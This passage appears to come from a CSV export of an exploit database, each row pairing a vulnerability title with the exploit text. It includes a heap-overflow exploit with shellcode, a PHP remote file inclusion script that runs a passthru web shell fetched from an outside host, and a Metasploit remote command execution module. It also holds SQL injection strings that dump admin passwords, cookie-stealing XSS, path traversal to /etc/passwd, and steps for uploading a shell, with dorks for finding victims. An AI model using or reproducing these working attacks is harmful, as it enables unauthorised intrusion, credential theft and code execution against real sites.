malloc_chunk *)(SHELLCODE);    mc.bk=(struct malloc_chunk *)(FREE_HOOKZ-8);     s=socket(AF_INET,SOCK_STREAM,0);    connect(s,(struct sockaddr *)&dst,sizeof(dst));    memcpy(magic+atoi(argv[4]),&mc,sizeof(mc));     if((atoi(argv[3])/2)<atoi(argv[4])){       /* putting jmps and shellcode before the struct */       for(i=0;i<(atoi(argv[4])-strlen(c0de)-10);i+=2){ 	 memcpy(magic+i,jmps,2);       }    }    else {       /* putting jmps and shellcode after the struct */       for(i=atoi(argv[4])+sizeof(mc);i<atoi(argv[3])-10-strlen(c0de);i+=2){ 	 memcpy(magic+i,jmps,2);       }    }    memcpy(magic+i,c0de,strlen(c0de));     magic[atoi(argv[3])]=0;     printf(""strlen magic is %i\n"",strlen(magic));    sndbuff[snprintf(sndbuff,atoi(argv[3])+20,""connect %s://\n"",magic)]=0;    printf(""shooting\n"");    err=send(s,sndbuff,strlen(sndbuff),0); }",remote,remote,1
2631,"Ascended Guestbook 1.0.0 - 'embedded.php' File Inclusion #!/usr/bin/php -q -d short_open_tag=on <? print	    - - [DEVIL TEAM THE BEST POLISH TEAM] - -   Ascended Guestbook <= 1.0.0 (embedded.php) Remote File Include Exploit [Script name: Ascended Guestbook 1.0.0 [Script site: http://www.ascdevel.com/pages/products/aguestbook/download.php Find by: Kacper (a.k.a Rahim) DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam Contact: kacper1964@yahoo.pl or http://www.rahim.webd.pl/ (c)od3d by Kacper -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Greetings DragonHeart and all DEVIL TEAM Patriots :) - Leito & Leon  TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios,  mIvus, nukedclx, SkD, wacky ';  if ($argc<4) { print (' -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Usage: php '.$argv[0].' host shell cmd OPTIONS host:      script server (ip/hostname) shell:     path to shell (<?passthru($_GET[cmd]);?>) cmd:       a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' localhost http://www.evilsite.com/shell.txt ls -la -P1.1.1.1:80 shell.txt: <?php ob_clean();echo""Hacker_Kacper_Made_in_Poland!!..Hauru..^_^..the..best..polish..team..Greetz"";ini_set(""max_execution_time"",0);echo ""hauru"";passthru($_GET[""cmd""]);die;?> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- '); die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $shell=$argv[2]; $cmd="""";  $port=80; $proxy=""""; for ($i=3; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if ($proxy=='') {$p='http://'.$host.':'.$port;}  $packet =""GET "".$p.""embedded.php?CONFIG[path]="".$shell.""?cmd="".$cmd.""%00 HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); if (strstr($html,""hauru"")) { $temp=explode(""hauru"",$html); die($temp[1]); } echo ""Exploit err0r :(""; echo ""Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam""; ?>  # milw0rm.com [2006-10-24]",remote,webapps,1
43411,"HP Mercury LoadRunner Agent magentproc.exe - Remote Command Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::Tcp   include Msf::Exploit::CmdStager    def initialize(info={})     super(update_info(info,       'Name'           => ""HP Mercury LoadRunner Agent magentproc.exe Remote Command Execution"",       'Description'    => %q{         This module exploits a remote command execution vulnerablity in HP LoadRunner before 9.50         and also HP Performance Center before 9.50. HP LoadRunner 12.53 and other versions are         also most likely vulneable if the (non-default) SSL option is turned off.         By sending a specially crafted packet, an attacker can execute commands remotely.         The service is vulnerable provided the Secure Channel feature is disabled (default).       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Unknown', # Original discovery # From Tenable Network Security           'aushack'  # metasploit module         ],       'References'     =>         [           ['CVE', '2010-1549'],           ['ZDI', '10-080'],           ['BID', '39965'],           ['URL', 'https://support.hpe.com/hpsc/doc/public/display?docId=c00912968']         ],       'Payload'        => { 'BadChars' => ""\x0d\x0a\x00"" },       'Platform'       => 'win',       'Targets'        =>         [           # Note: software reportedly supports Linux - may also be vulnerable.           ['Windows (Dropper)',           'Platform'   => 'win',           'Arch'       => [ARCH_X86, ARCH_X64]           ],         ],       'Privileged'     => false,       'Stance'         => Msf::Exploit::Stance::Aggressive,       'DisclosureDate' => 'May 06 2010',       'DefaultTarget'  => 0))        register_options([Opt::RPORT(54345)])   end    def autofilter     true   end    def execute_command(cmd, _opts = {})     guid = Rex::Text.encode_base64(Rex::Text.rand_text_alphanumeric(17))     randstr = Rex::Text.rand_text_alpha(16)     server_name = Rex::Text.rand_text_alpha(7)     server_ip = datastore['LHOST']     server_port = Rex::Text.rand_text_numeric(4)     # If linux is one day supported, cmd1 = /bin/sh and cmd2 = -c cmd     cmd1 = ""C:\\Windows\\system32\\cmd.exe""     cmd2 = ""/C \""#{cmd}\""""      pkt1 = [0x19].pack('N') + guid + '0'      pkt2 = [0x6].pack('N') + [0x0].pack('N') + ""(-server_type=8)(-server_name=#{server_name})(-server_full_name=#{server_name})""     pkt2 << ""(-server_ip_name=#{server_ip})(-server_port=#{server_port})(-server_fd_secondary=4)(-guid_identifier=#{guid})\x00\x00""     pkt2 << [0x7530].pack('N')      pkt3 = [4 + pkt2.length].pack('N') + pkt2      pkt4 = [0x1c].pack('N') + [0x05].pack('N') + [0x01].pack('N') + randstr + pkt3      pkt5 = [pkt4.length].pack('N') + pkt4      pkt6 = [0x437].pack('N') + [0x0].pack('N') + [0x31].pack('N') + [1].pack('N') + [0x31000000].pack('N')     pkt6 << [cmd1.length].pack('N') + cmd1 + ""\x00"" + [cmd2.length].pack('N') + cmd2 + [0x0].pack('N') + [0x0].pack('N')      pkt7 = [4 + pkt6.length].pack('N') + pkt6      pkt8 = [0x18].pack('N') + [0x04].pack('N') + randstr + pkt7      pkt9 = [pkt8.length].pack('N') + pkt8      sploit = pkt1 + pkt5 + pkt9      connect     sock.put(sploit)     disconnect  end    def exploit       print_status('Sending payload...')       execute_cmdstager(linemax: 1500)   end end",remote,remote,1
19045,"SunOS 4.1.3 - '/etc/crash' SetGID kmem Privilege Escalation source: https://www.securityfocus.com/bid/59/info  /etc/crash was installed setgid kmem and excutable by anyone. Any user can use the ! shell command escape to executes commands, which are then performed with group set to kmem.  $ /etc/crash ! sh",local,local,1
4103,"bugmall shopping cart 2.5 - SQL Injection / Cross-Site Scripting --==+================================================================================+==-- --==+           BUG MALL SHOPPING CART 2.5 AND PRIOR SQL, XSS, DEFAULT LOGINS VULNERABILITYS       +==-- --==+================================================================================+==--    AUTHOR: t0pP8uZz & xprog (Excellent Work xprog thanks :D)   SCRIPT DOWNLOAD: http://www.bug-mall.org/downloads/bugmall.zip  ORIGINAL ADVISORY CAN BE FOUND HERE: http://www.h4cky0u.org/viewtopic.php?t=26834   SITE: http://www.bug-mall.org   DORK: Powered by Bug Software intext:Your Cart Contains   EXPLOITS:  EXPLOIT 1: http://www.site.com/BugMallPAth/index.php?msgs=[HTML, JAVASCRIPT] EXPLOIT 2: The basic search box is vulnerable to sql injection, check examples for detail. EXPLOIT 3: The script seems to have a default login, username:demo password: demo, we have tried this on several sites and sucsefully logged in.   EXAMPLES:  EXAMPLE 1 ON DEMO: http://www.bug-mall.org/computerstore/index.php?msgs=<html><body>VULN BY<br>t0pP8uZz<br>h4cky0u.org</body><html> EXAMPLE 2 ON DEMO: http://www.bug-mall.org/computerstore/index.php?msgs=<script>alert(""XSS"")</script> EXAMPLE 3: Paste following into search box  ' and 1=2 UNION ALL SELECT 1,2,3,4,concat(username,':',password),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102 from clientes/*   Note: Some servers may be running older version of MYSQL and make it harder to inject without UNION.  GREETZ: str0ke, GM, andy777, Untamed, Don, o0xxdark0o, & everyone at H4CKY0u.org, BHUNITED AND G0t-Root.net  FROM GM!: Kw3[R]ln get over it :D.   --==+================================================================================+==-- --==+           BUG MALL SHOPPING CART 2.5 AND PRIOR SQL, XSS, DEFAULT LOGINS VULNERABILITYS       +==-- --==+================================================================================+==--  # milw0rm.com [2007-06-25]",remote,webapps,1
26096,Jax PHP Scripts 1.0/1.34/2.14/3.31 - suggestions.csv User IP Disclosure source: https://www.securityfocus.com/bid/14482/info                 Jax PHP Scripts are affected by multiple cross-site scripting vulnerabilities. These issues are due to a failure in the applications to properly sanitize user-supplied input.                 An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/linklists/suggestions.csv,remote,webapps,1
6313,"CMME 1.12 - Local File Inclusion / Cross-Site Scripting / Cross-Site Request Forgery/Download Backup/Make Directory ################################################################################################################## [+] CMME 1.12 (LFI/XSS/CSRF/Download Backup/MkDir) Multiple Remote Vulnerabilities  [+] Discovered By SirGod                         [+] www.mortal-team.org                         [+] Greetz : E.M.I.N.E.M,Ras,Puscas_marin,ToxicBlood,MesSiAH,xZu,HrN,kemrayz ##################################################################################################################  [+] Local File Inclusion      Note : magic_quotes_gpc must be off.       Example :       http://localhost/index.php?page=weblog&env=[Local File]%00      PoC :       http://localhost/index.php?page=weblog&env=../../../autoexec.bat%00       [+] Download Backup       Example 1:         http://localhost/backup/[Backup Name].zip       PoC 1:         http://localhost/backup/cmme_data.zip       Live Demo 1:         http://cmme.oesterholt.net/backup/cmme_data.zip       Example 2:         http://localhost/backup/[Backup Name].zip       PoC 2:         http://localhost/backup/cmme_cmme.zip       Live Demo 2:         http://cmme.oesterholt.net/backup/cmme_cmme.zip         [+] Make Directory      You can make multiple directories in website root folder.        Example 1:               http://localhost/admin.php?action=login&page=home&script=index.php&env=[Directory]        PoC 1:          http://localhost/admin.php?action=login&page=home&script=index.php&env=!!!Owned!!!       Or you can make dir in previous directory,etc.        Example 2:          http://localhost/admin.php?action=login&page=home&script=index.php&env=../[Directory]        PoC 2:          http://localhost/admin.php?action=login&page=home&script=index.php&env=../!!!Owned!!!   [+] Cross Site Scripting         Example 1:             http://localhost/statistics.php?action=hstat_year&page=[XSS}&env=data       PoC 1:        http://localhost/statistics.php?action=hstat_year&page=<script>alert(document.cookie)</script>&env=data       Live Demo 1:        http://cmme.oesterholt.net/statistics.php?action=hstat_year&page=<script>alert(document.cookie)</script>&env=data       Example 2:        http://localhost/statistics.php?action=hstat_year&year=[XSS]&env=data       PoC 2:        http://localhost/statistics.php?action=hstat_year&year=<script>alert(document.cookie)</script>&env=data       Live Demo 2:             http://cmme.oesterholt.net/statistics.php?action=hstat_year&year=<script>alert(document.cookie)</script>&env=data   [+] Cross Site Request Forgery      If an logged in user with administrator privileges clicks the following link he will be logged out.        http://localhost/admin.php?action=logout&page=home&env=data   ##################################################################################################################  # milw0rm.com [2008-08-26]",remote,webapps,1
6585,"openEngine 2.0 beta2 - Remote File Inclusion **************************************************************************************  Author : By Crackers_Child Contact: cashr00t@hotmail.com Greetz : str0ke & All My Friends  ************************************************************************************** Script   : openEngine 2. 0 beta2 Remote File include Vulnerable Download :http://downloads.sourceforge.net/openengine/openengine20_beta2.zip?modtime=1203083918&big_mirror=0  **************************************************************************************  Exploit : Site.com/script_path/cms/classes/openengine/filepool.php?oe_classpath=Shellz?   **************************************************************************************  Vulberable : include($oe_classpath.""/openengine/thumbnail.php""); (filepool.php)   **************************************************************************************  N0te : Mubarek Ramazan Bayraminiz Kutlu Olsun Ey Musluman Halki :) **************************************************************************************  # milw0rm.com [2008-09-26]",remote,webapps,1
5564,"Shader TV (Beta) - Multiple SQL Injections Shader TV (Beta) Multiple Remote SQL Ä°njection Vulnerable   Script : http://www.aspindir.com/indir.asp?ID=5441  Script : http://rapidshare.de/files/39341463/ShaderTV.zip.html  Coded  : Asp  Lnguae : Acces   Discovered By U238 | < Ugurcan Engin >   Friends : ka0x - The_BekiR - Marco Almeida - Erhan Bulut - Caborz  :  Web - Designer Solution Developer  setuid.noexec0x1@hotmail.com  http://noexec.blogspot.com    0x1 = [S** Says : Allah BelanÄ± Versin Ulan Åžiz0 !]  0x2 = [Ben Sadece Ä°yi Bir Ä°nsan Olmak Ä°stemistim ]    Exploit:  Administrator Login to  creative web panel is atack of to SQL injectin.   http://localhost:2222/lab/ShaderTV/yonet/kanal.asp?islem=degistir&sid=13+union+select+0,kullanici,parola,3,4,5+from+tblyonetici  ----  http://localhost:2222/lab/ShaderTV/yonet/google.asp?islem=degistir&sid=1+union+select+0,parola+from+tblyonetici&sayfa=1  http://localhost:2222/lab/ShaderTV/yonet/google.asp?islem=degistir&sid=1+union+select+0,kullanici+from+tblyonetici&sayfa=1  ----  http://localhost:2222/lab/ShaderTV/yonet/hakk.asp?islem=degistir&sid=2+union+select+0,parola+from+tblyonetici  http://localhost:2222/lab/ShaderTV/yonet/hakk.asp?islem=degistir&sid=2+union+select+0,kullanici+from+tblyonetici   Administrator Panel :   target/ShaderTV/yonet    -------------------------------  Admin Panel Login Bypass :  target/ShaderTV/yonet/default.asp   username : 'or' 1=1  password : 'or' 1=1   This is Admin Panel See You ?   ---------------------------------  # milw0rm.com [2008-05-08]",remote,webapps,1
43895,"ManageEngine Netflow Analyzer / IT360 - Arbitrary File Download >> Arbitrary file download in ManageEngine Netflow Analyzer and IT360 >> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security ========================================================================== Disclosure: 30/11/2014 / Last updated: 3/12/2014  >> Background on the affected product: ""NetFlow Analyzer, a complete traffic analytics tool, leverages flow technologies to provide real time visibility into the network bandwidth performance. NetFlow Analyzer, primarily a bandwidth monitoring tool, has been optimizing thousands of networks across the World by giving holistic view about their network bandwidth and traffic patterns. NetFlow Analyzer is a unified solution that collects, analyzes and reports about what your network bandwidth is being used for and by whom.""  ""Managing mission critical business applications is now made easy through ManageEngine IT360. With agentless monitoring methodology, monitor your applications, servers and databases with ease. Agentless monitoring of your business applications enables you high ROI and low TOC. With integrated network monitoring and bandwidth utilization, quickly troubleshoot any performance related issue with your network and assign issues automatically with ITIL based ServiceDesk integration.""  This is being released as a 0-day because ManageEngine have been twiddling their thumbs (and making a fool out of me) for 105 days. See timeline below for explanation.   >> Technical details: Vulnerability: Arbitrary file download Constraints: unauthenticated in NetFlow; authenticated in IT360 Affected versions: NetFlow v8.6 to v10.2; at least IT360 v10.3 and above  CVE-2014-5445: GET /netflow/servlet/CSVServlet?schFilePath=/etc/passwd GET /netflow/servlet/CReportPDFServlet?schFilePath=C:\\boot.ini&pdf=true  CVE-2014-5446 GET /netflow/servlet/DisplayChartPDF?filename=../../../../boot.ini  All 3 servlets can be exploited in both Windows and Linux. A Metasploit module that exploits CVE-2014-5445 has been released.   >> Fix:  UNFIXED - ManageEngine failed to take action after 105 days.  Timeline of disclosure: 18/08/2014 - Requested contact via ManageEngine Security Response Center.  19/08/2014 - Received contact from the NetFlow Analyzer support team. Responded with the security advisory above detailing the vulnerabilities. - Further back and forth explaining the vulnerabilities, how to exploit them and their impact.  22/08/2014 - Requested information regarding the release date for the fix. Received response ""We do not have a ETA on this, I will check with our engineering team and update  you.""  22/09/2014 - Requested information regarding the release date for the fix. Received response ""We expect that the new release will be within the next couple of weeks"".  20/10/2014 - Requested information regarding the release date for the fix. Received response ""Our new release will be happening early by next week, you can get the update in our NetFlow Analyzer website"". - Asked if they are sure that the fix will be included in the new release. Received response ""yes you are correct, the issue that you have specified is fixed in new release"".  27/10/2014 - NetFlow Analyzer version 10.2 released - still vulnerable.  - Sent an email to ManageEngine asking if they are going to release a fix soon. Received response ""We will release the PPM file of the upgrade soon, in which we have fixed the Vulnerability you mentioned"".  5/11/2014 - Requested information regarding the release date for the fix. Received response ""You can expect the release before this month end"".  28/11/2014 - Requested information regarding the release date for the fix. Received response ""The PPM file is in testing phase and will be released in next Month"". - Asked if they can commit to a date. Received response ""the ppm is in testing phase now, as it is one of the major release, we will not be able to give an exact date of release"".  30/11/2014 - Realised that ManageEngine have been playing me for 105 days, and immediately released advisory and exploit.  ================ Agile Information Security Limited http://www.agileinfosec.co.uk/ >> Enabling secure digital business >>",remote,webapps,1
19127,"Verity Search97 2.1 - Security source: https://www.securityfocus.com/bid/162/info  A pair of vulnerabilities exist in Verity's Search`97 web interface to the Verity search engine. The first vulnerability is due to cgi-bin scripts, s97_cgi and s97r_cgi failing to check for the existence of certain shell meta characters. This allows an attacker to access any file on the file system.  The second vulnerability is due to a lack of authentication being used to access the Verity administrative program. Any user can telnet to the appropriate port, and issue a command to shut the Verity software down.  s97_cgi: http://www.xxx.com/search97.vts ?HLNavigate=On&querytext=dcm &ServerKey=Primary &ResultTemplate=../../../../../../../etc/passwd &ResultStyle=simple &ResultCount=20 &collection=books  tasmgr: telnet to port 1972  0 Verity dcm ready list 0 TAS-Primary status tas-primary 0 TYPE=PROCESS; STATE=RUNNING; STARTUP=AUTO_START; PID=87632 stop tas-primary 0 'tas-primary' signalled status tas-primary 0 TYPE=PROCESS; STATE=STOPPING; STARTUP=AUTO_START; PID=87632 where 0 /home/verity/_hpux10/bin/dcm.cfg",remote,remote,1
25756,"India Software Solution Shopping Cart - SQL Injection source: https://www.securityfocus.com/bid/13812/info  India Software Solution Shopping Cart is prone to an SQL injection vulnerability.  This vulnerability could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.  All versions are considered to be vulnerable at the moment.   Uername =admin Password="" or 0=0 #",remote,webapps,1
22061,"Cyrus IMAPD 1.4/1.5.19/2.0.12/2.0.16/2.1.9/2.1.10 - Pre-Login Heap Corruption source: https://www.securityfocus.com/bid/6298/info  Cyrus IMAPD is a freely available, open source Interactive Mail Access Protocol (IMAP) daemon. It is available for Unix and Linux operating systems.  It has been reported that Cyrus IMAPD does not sufficiently handle overly long strings. In some cases, when a user connects to the daemon, and upon negotiating the connection sends a login string of excessive length, a buffer overflow occurs. This could result in heap corruption and arbitrary words in memory being overwritten. It may be possible to exploit this issue to execute arbitrary code.  perl -e 'print ""x login {4294967295}\r\n\xf0\xef\xff\xbf\x90\xef\xff\xbf\xfc\xff\xff\xff\xfc\xff\xff\xff"";'|nc localhost imap2 <ctrl-c>",local,dos,1
46184,"Microsoft Windows 10 - 'RestrictedErrorInfo' Unmarshal Section Handle Use-After-Free Windows: RestrictedErrorInfo Unmarshal Section Handle UAF EoP Platform: Windows 10 1709/1809 Class: Elevation of Privilege Security Boundary (per Windows Security Service Criteria): User boundary  Summary: The WinRT RestrictedErrorInfo doesn’t correctly check the validity of a handle to a section object which results in closing an unrelated handle which can lead to EoP.  Description: The RestrictedErrorInfo class is a COM object implemented internal to the COM runtime. It’s used to pass structured error information across WinRT apartment and process boundaries. For that reason it supports a custom marshaling protocol and as it’s part of the system infrastructure it also marked a system trusted marshaler. It can be sent to processes which explicitly prevent custom marshaling such as many system services as well as AppContainer processes.   To send larger amounts of information such as the stack trace (and perhaps for security reasons) the marshaler will insert the name of a section object as well as a handle to that object into the marshaled stream. As COM marshaling doesn’t directly support passing handles, at least without additional help, the unmarshal code opens the client process and duplicates a SYNCHRONIZE only handle to the section into that process. The presumed idea behind passing this handle is it can be used to verify the section name is not some arbitrary section object. This validation takes place in the following code:  HRESULT CRestrictedError::ValidateHandle(   HANDLE hSection, const wchar_t *pszSectionName, unsigned int cchSectionName) {   if ( !hSection && !*pszSectionName )     return S_OK;   ULONG length;   NTSTATUS status = NtQueryObject(hSection, ObjectNameInformation, NULL, NULL, &length);   if (status == STATUS_INFO_LENGTH_MISMATCH )   {     PUNICODE_STRING name = malloc(length);     NtQueryObject(hSection, ObjectNameInformation, name, length, NULL);     ULONG total_length = name->Length / 2;       if (length < 60)         return E_INVALID_ARG;       LPWSTR str = name.Buffer[name->Length - 60 * 2];       if (wmemcmp(L""RestrictedErrorObject-"", str, 22))         return E_INVALID_ARG;       size_t name_length  = wcslen(pszSectionName);       if (wmemcmp(pszSectionName, str, name_length))         return E_INVALID_ARG;       return S_OK;   }   return E_ERROR; }  ValidateHandle takes the handle from the marshaled data and uses NtQueryObject to get its object name. This name, minus any leading name information is then compared against the passed in section name. If they’re not equal then this function fails and the section information is ignored. There’s two issues with this code, firstly it just checks the last 60 characters of the string matches “RestrictedErrorObject-” plus an arbitrary suffix. Secondly, and most importantly, it doesn’t verify that the handle is a section object, it just verifies the name.   This might not be a major issue except that once the handle is validated the code assumes ownership of the handle. Therefore once the code is finished with the handle, which can be in the unmarshaler or when the RestrictedErrorInfo object is released, the handle will be closed. If the handle is set to a pre-existing handle inside the unmarshaling process, as long as it meets the name requirements the handle will be closed and the handle entry opened for reuse. This can lead to a UAF on an arbitrary handle.  One way of exploiting this would be to attack the BITS service which as demonstrated many times is a good privileged target for these sorts of attacks:  1) Create a job writing a file to the path “C:\RestrictedErrorObject-PADDING\OUTPUT.TXT”. This results in BITS creating a temporary file “C:\RestrictedErrorObject-PADDING\BITSXXXX.tmp”.  2) Start the job and stall the GET request for the HTTP data, this is easy to do by requesting BITS downloads a URL from localhost and setting up a simple HTTP server. 3) BITS now has an open, writable handle to the temporary file which the last 60 characters is of the form “RestrictedErrorObject-PADDING\BITSXXXX.tmp”. 4 ) Marshal an error object, specifying the handle value for the temporary file (might have to brute force) and the section name using the name from 3. Send it to the BITS service using whatever mechanism is most appropriate. As the downloading is happening in a background thread the COM service is still accessible. 5) The unmarshaler will verify the handle then close the handle. This results in the stalled download thread having a stale handle to the temporary file. 6) Perform actions to replace the handle value with a different writable file, one which the user can’t normally write to. 7) Complete the GET request to unblock the download thread, the BITS service will now write arbitrary data to the handle.   As the download thread will close the arbitrary handle, instead of 6 and 7 you could replace the handle with some other resource such as a token object and then get a UAF on a completely arbitrary handle type leading to other ways of exploiting the same bug.  From a fixing perspective you really should do a better job of verifying that the handle is a section object, although even that wouldn’t be foolproof.  Proof of Concept:  I’ve provided a PoC as a C# project. Note that this doesn’t do an end to end exploit, it just demonstrates the bug in the same process as it’s a more reliable demonstration. This shouldn’t be a problem but if you really can’t see this is a security issue then… The PoC will create a file which will match the required naming pattern, then insert that into the marshaled data. The data will then be unmarshaled and the handle checked. Note that I release the COM object explicitly rather than waiting for the garbage collector as the handle is only released when the underlying COM object is released. For an attack on a native service this would not be necessary, but it’s mostly a quirk of using C#.  1) Compile the C# project. It will need to grab the NtApiDotNet from NuGet to work. 2) Run the PoC.  Expected Result: The unmarshal process should fail, or the handle is valid after the unmarshal process.  Observed Result: The unmarshal process succeeds and the second call to obj.FullPath fails with an STATUS_INVALID_HANDLE error.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46184.zip",local,dos,1
21863,"Drupal 4.0 - News Message HTML Injection source: https://www.securityfocus.com/bid/5801/info  Problems with Drupal could allow an attacker to execute arbitrary script code in a vulnerable client.  Drupal fails to sufficiently filter potentially malicious HTML code from news posts. As a result, when a user views a news posting that contains malicious HTML code, the code contained in the posted message would be executed in their browser. This will occur in the context of the site running the Drupal software.   <IMG SRC=""javascript:alert('unsecure')"">",remote,webapps,1
25710,C'Nedra 0.4 Network Plugin - 'Read_TCP_String' Remote Buffer Overflow source: https://www.securityfocus.com/bid/13781/info  C'Nedra Network Plug-in is prone to a remotely exploitable buffer overflow vulnerability. The issue exists in the 'game_message_functions.cpp' source file and is due to inadequate bounds checking of user-supplied data.  This vulnerability could be exploited to execute arbitrary code in the context of the affected software.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/25710.zip,remote,remote,1
31464,"Surgemail 3.8 - IMAP LSUB Command Remote Stack Buffer Overflow source: https://www.securityfocus.com/bid/28377/info  SurgeMail is prone to a remote stack-based buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input.  Successfully exploiting this issue may allow remote attackers to execute arbitrary machine code in the context of the affected service. Failed exploit attempts will likely result in denial-of-service conditions.  SurgeMail 3.8k4 is vulnerable; other versions may also be affected.  # # #       Surgemail stack overflow PoC exploit - latest version #	Coded by Leon Juranic <leon.juranic@infigo.hr> #	http://www.infigo.hr/en/ #  use IO::Socket;   $host = ""192.168.0.15""; $user = ""test""; $pass = ""test""; $str = ""//AA:"";  $sock = IO::Socket::INET->new(PeerAddr => $host,         PeerPort => ""143"",         Proto    => ""tcp"") || die (""Cannot connect!!!\n"");            print $a = <$sock>;         print $sock ""a001 LOGIN $user $pass\r\n"";         print $a = <$sock>;         print $sock ""a002 LSUB "" . $str x 12000 . "" "" . $str x 21000 . ""\r\n"";         print $a = <$sock>;",remote,dos,1
17007,"Phpbuddies - Arbitrary File Upload  [!]===========================================================================[!]  [~] Phpbuddies 0day Arbitrary Upload File Vulnerability  [~] Author : Xr0b0t (xrt.interpol@gmx.us) [~] Homepage : www.indonesiancoder.com | xrobot.mobi | mc-crew.net | exploit-id.com [~] Date : 18 Mart, 2010 [~] Tested on : BlackBuntu RC2  [!]===========================================================================[!]  [ Software Information ]  [+] Vendor : http://phpbuddies.com [+] Download : http://phpbuddies.com/index.php?module=downloadcenter&action=download_home [+] Price : LICENSI REQUEST  [+] Vulnerability : Upload File  [+] Dork : ""Nothing Preson Laa!!"" ;) [+] Version : Not Find The Version  [!]===========================================================================[!]  Vulnerable Javascript Source Code: 	elseif(RequestForm('new_photo')!='')         {             $image = RequestForm('image');             $myphoto = RequestFile('myphoto');                          if($myphoto['name'] && !$myphoto['error'])             {                 $ext = implode(""|"",explode("","",$this->Settings->img_ext));                 $myupload = new UPLOAD();                 $upload_dir = RS_SYSTEM_PATH.""systemupload/profile"";                 $picture = $myupload->upload_file($upload_dir,'myphoto',true,false,0,$ext);                 if($picture == false){                     $this->assignVal('err','Photo is not uploaded.');                     $error = 1;                 }                 else                 {                     $phpThumb = new phpThumb();                     $phpThumb->setSourceFilename(str_replace('\\','/',RS_SYSTEM_PATH.""systemupload/profile/"".$picture));                     $phpThumb->setParameter('w',$this->Settings->thumb_img_width);                     $phpThumb->setParameter('h',$this->Settings->thumb_img_height);                     $output_filename = str_replace('\\','/',RS_SYSTEM_PATH.""systemupload/profile/thumb_"".$picture);                     if ($phpThumb->GenerateThumbnail())                     {                         $phpThumb->RenderToFile($output_filename);                     }                                          $mem_id = $this->Session->getValue('userid');                     $sql=sprintf(SQL_UPDATE_PROFILE_PHOTO,$picture,$mem_id);                     $this->Conn->Execute($sql);                                          if($image)                         $this->delete->remove_profile_photo($image);                                     }             }                 }>	 	------------------------------------------------------------------------	 	 [ Default Site ]     http://127.0.0.1/phpbuddies/    [ XpL ]  	[~] Step 1 : Find A CMS With Google Dork   	[~] Step 2: Register In This Site   	[~] Step 3: Click On Account Settings 	 	[~] Step 4: Click On Upload Images    	[~] Step 5: Click On File Will Be Uploaded ( Uploaded The File *.php or *.jgp)   	[~] Step 6: And Click on Manage Photo   	[~] Step 7: You Will See the file systemupload/profile/ 		 	 [ Demo ] 	 	Site	: http://127.0.0.1/phpbuddies/ 	 	exploit : http://127.0.0.1/phpbuddies/index.php?module=profile&action=myaccount 			  ""Upload The shell.php 